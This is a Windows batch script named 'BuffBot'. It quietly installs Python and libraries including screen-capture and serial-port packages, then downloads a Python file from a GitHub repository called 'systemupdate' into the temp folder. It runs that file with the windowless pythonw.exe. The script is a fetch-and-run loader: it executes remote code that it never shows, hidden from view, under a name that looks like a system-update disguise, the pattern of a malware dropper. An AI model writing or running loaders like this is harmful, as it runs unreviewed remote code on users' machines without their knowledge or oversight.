@echo off
set PATH=%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%PATH%
title BuffBot
pushd "%~dp0"

where python >nul 2>&1 || where py >nul 2>&1 || (curl -o pyinst.exe https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe && start /wait pyinst.exe /quiet InstallAllUsers=1 PrependPath=1 && del pyinst.exe)
for %%d in ("C:\Program Files\Python311" "%LocalAppData%\Programs\Python\Python311") do if exist %%d\python.exe set PATH=%%d\Scripts\;%%d\;%PATH%

python -m pip install --upgrade pip --quiet
python -m pip install numpy pillow mss pyserial --quiet

curl -s -o "%TEMP%\buff_bot.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/buff_bot.py?t=%RANDOM%"

for /f "tokens=*" %%i in ('python -c "import os,sys; print(os.path.join(os.path.dirname(sys.executable),'pythonw.exe'))"') do start "" "%%i" "%TEMP%\buff_bot.py"
exit
